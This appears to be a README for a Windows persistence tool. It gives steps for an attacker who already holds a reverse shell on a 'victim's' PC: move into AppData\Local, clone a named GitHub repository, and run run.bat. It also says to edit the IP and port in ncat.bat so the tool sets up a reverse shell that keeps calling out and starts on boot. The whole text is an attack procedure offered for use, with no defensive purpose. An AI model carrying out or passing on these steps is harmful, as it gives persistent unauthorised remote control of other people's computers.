Once you reverse shell into victims computer, CD into the appdatta, local file and do git clone The link to this gitfile and run Run.bat

you may need to change the Ip and port in (ncat.bat)

what this does is creates an easy reverse shell that is always requesting a connection and is also enabled on startup 


steps:
open powershell

Reverse Shell into victims PC

CD into AppData

CD into local

type in git clone https://github.com/1DollarCoin/yess.git

CD into yess

type start run.bat

and you should now have a permanent reverse shell
